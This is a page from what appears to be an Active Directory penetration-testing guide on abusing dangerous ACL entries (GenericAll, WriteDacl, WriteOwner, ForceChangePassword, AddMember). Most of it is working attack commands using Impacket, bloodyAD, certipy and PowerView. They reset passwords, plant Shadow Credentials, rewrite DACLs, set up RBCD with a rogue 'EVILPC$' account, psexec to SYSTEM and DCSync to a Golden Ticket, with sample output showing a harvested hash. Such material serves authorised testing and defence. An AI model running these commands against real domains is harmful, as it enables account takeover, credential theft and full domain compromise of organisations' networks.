---
layout: default
title: "ACL / DACL Abuse (GenericAll, WriteDacl, ...)"
order: 4
phase: "PRIVESC"
tactic: "Privilege Escalation"
summary: "Abuse dangerous ACEs — GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, AddMember — to seize control of users, groups and computers."
---

{% include ad_nav.html %}

# ACL / DACL Abuse

## Pre-requisites

<div class="badges">
  <span class="badge req">Any valid domain credential</span>
  <span class="badge req">A dangerous ACE you control (from BloodHound)</span>
  <span class="badge req">LDAP/LDAPS reachable (389/636)</span>
</div>

- A valid domain credential (or hash) for the principal that **holds** the ACE.
- BloodHound output showing an "Outbound Object Control" edge from your principal to a target.
- LDAP write access to the DC (`bloodyAD`, `PowerView`, `dacledit`, `net rpc`).

## Mechanism & Theory

Every AD object has a **Security Descriptor** containing a **DACL** — an ordered list of **ACEs** (Access Control Entries). Each ACE grants a principal a specific right over the object. Misconfigured ACEs let a low-privileged principal modify a high-privileged one. The abuse always follows the same idea: *use the right you have to grant yourself a right you want* (reset a password, add yourself to a group, take ownership, or rewrite the DACL entirely).

### The dangerous rights (edges)

| ACE / Edge | What it grants | Primary abuse |
|------------|----------------|---------------|
| **GenericAll** | Full control | Anything below: reset pw, add to group, RBCD, targeted roast |
| **GenericWrite** | Write any non-protected attribute | Set SPN (roast), set logon script, RBCD |
| **WriteDacl** | Rewrite the object's DACL | Grant yourself GenericAll, then proceed |
| **WriteOwner** | Change the object owner | Set self as owner → grant self GenericAll |
| **Owns** | You are the owner | Edit the DACL directly |
| **ForceChangePassword** | Reset password w/o knowing old | Take over the user account |
| **AddMember / GenericWrite on group** | Modify membership | Add self to privileged group |
| **AllExtendedRights** | All extended rights incl. DCSync | Password reset, DS-Replication (DCSync) |
| **AddKeyCredentialLink** | Write msDS-KeyCredentialLink | Shadow Credentials (PKINIT) |

<div class="attack-diagram">
  <div class="diag-title">ACL / DACL abuse — collapse to GenericAll, then take over</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Owned principal</span><span class="n-tool">BloodHound edge</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">WriteOwner / WriteDacl</span><span class="n-tool">owneredit / dacledit</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">Grant GenericAll</span><span class="n-tool">FullControl ACE</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">Abuse control</span><span class="n-tool">reset pw / RBCD / shadow</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">Control target</span><span class="n-tool">user / group / computer</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">Domain Admin</span><span class="n-tool">DCSync</span></div>
  </div>
</div>

## Step-by-step by edge

### A) ForceChangePassword — reset a user's password

```bash
export DC=10.10.10.100 ; export DOMAIN=corp.local
# Impacket (no need to know the old password)
impacket-changepasswd -reset $DOMAIN/victim@$DC -newpass 'N3wP@ss!2026' -altuser m.rossi -altpass 'Welcome2026!'

# bloodyAD equivalent
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC set password victim 'N3wP@ss!2026'

# net rpc (great over a SOCKS pivot)
net rpc password victim 'N3wP@ss!2026' -U "$DOMAIN"/m.rossi%'Welcome2026!' -S $DC
```

### B) GenericWrite / GenericAll on a USER — Targeted Kerberoast or Shadow Credentials

```bash
# Option 1: add an SPN → Kerberoast (see Kerberoasting module)
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC set object victim servicePrincipalName -v "fake/svc"
impacket-GetUserSPNs $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC -request-user victim

# Option 2: Shadow Credentials (no password change, stealthier) — needs AddKeyCredentialLink/GenericWrite
certipy-ad shadow auto -u m.rossi@$DOMAIN -p 'Welcome2026!' -account victim -dc-ip $DC
# -> yields victim's NT hash + a PKINIT TGT (.ccache) instantly
```

```terminal
[*] Targeting user 'victim'
[*] Generating certificate
[*] Adding Key Credential with device ID ... to the Key Credentials for 'victim'
[*] Authenticating as 'victim' with the certificate
[*] Got hash for 'victim@corp.local': aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

### C) GenericAll / AddMember on a GROUP — add yourself

```bash
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC add groupMember "Helpdesk Admins" m.rossi
# verify
nxc ldap $DC -u m.rossi -p 'Welcome2026!' --query "(sAMAccountName=m.rossi)" "memberOf"
# PowerView (from Windows)
Add-DomainGroupMember -Identity 'Helpdesk Admins' -Members 'm.rossi'
```

### D) WriteDacl — grant yourself GenericAll, then abuse

```bash
# dacledit (Impacket) — write a full-control ACE for yourself onto the target
impacket-dacledit -action write -rights FullControl -principal m.rossi -target-dn "CN=victim,CN=Users,DC=corp,DC=local" $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC
# now you have GenericAll → go to (A)/(B)

# bloodyAD helper
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC add genericAll "CN=victim,CN=Users,DC=corp,DC=local" m.rossi
```

### E) WriteOwner — take ownership then rewrite DACL

```bash
impacket-owneredit -action write -new-owner m.rossi -target victim $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC
impacket-dacledit -action write -rights FullControl -principal m.rossi -target victim $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC
```

### F) GenericAll / GenericWrite on a COMPUTER — RBCD (Resource-Based Constrained Delegation)

```bash
# 1. Create/own a machine account we control (default MAQ lets any user add 10)
impacket-addcomputer $DOMAIN/m.rossi:'Welcome2026!' -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' -dc-ip $DC

# 2. Configure RBCD: allow EVILPC$ to delegate to the target computer TARGET$
impacket-rbcd -action write -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -dc-ip $DC $DOMAIN/m.rossi:'Welcome2026!'

# 3. Request a ticket impersonating Administrator to a service on TARGET
impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate Administrator -dc-ip $DC $DOMAIN/'EVILPC$':'EvilPass123!'
export KRB5CCNAME=Administrator.ccache

# 4. Use it (Pass-the-Ticket)
impacket-psexec -k -no-pass TARGET.corp.local
```

BloodHound outbound-control path (what the graph reveals):

```terminal
 (owned)                     ForceChangePassword
 [ m.rossi ] --------------------------------------> [ svc_helpdesk ]
                                                            |  MemberOf
                                                            v
                                                    ( Helpdesk Admins )
                                                            |  GenericAll
                                                            v
                                                      [[ DC01 ]]  => RBCD => SYSTEM on the DC
```

## Complete Attack Chain

```terminal
[1] one credential ─► bloodhound-python ─► BloodHound graph
[2] "Shortest Path to Domain Admins" reveals:
        m.rossi --ForceChangePassword--> svc_helpdesk
        svc_helpdesk --GenericAll------> "Helpdesk Admins" (group)
        "Helpdesk Admins" --GenericAll--> DC01 (computer)
[3] reset svc_helpdesk pw            (edge A)
[4] add svc_helpdesk to Helpdesk Admins? no — add SELF via group GenericAll (edge C)
[5] "Helpdesk Admins" has GenericAll on DC01 ─► RBCD (edge F)
        addcomputer EVILPC$ ─► rbcd write ─► getST impersonate Administrator
[6] psexec -k DC01  ─► SYSTEM on the Domain Controller
        │
        ▼
[7] impacket-secretsdump (DCSync) ─► krbtgt ─► Golden Ticket ─► permanent domain control
```

<div class="callout tip">
  <span class="callout-title">Chaining rule of thumb</span>
  WriteOwner → (set owner) → WriteDacl → (grant GenericAll) → GenericAll → (reset pw / RBCD / roast). Almost every ACL path collapses into "get GenericAll, then take over".
</div>

<div class="callout danger">
  <span class="callout-title">Clean up</span>
  Password resets can lock legitimate users out and break services. On real engagements, record the original values, prefer Shadow Credentials (non-destructive), and revert added group memberships / SPNs / ACEs afterwards.
</div>

## Key Takeaways

- BloodHound's outbound-control edges are a to-do list; each maps to one command above.
- **Shadow Credentials** (AddKeyCredentialLink/GenericWrite) is the stealthy, reversible favourite.
- Computer-object control → **RBCD** → SYSTEM on that host, frequently on a DC.

{% include toc_sidebar.html %}
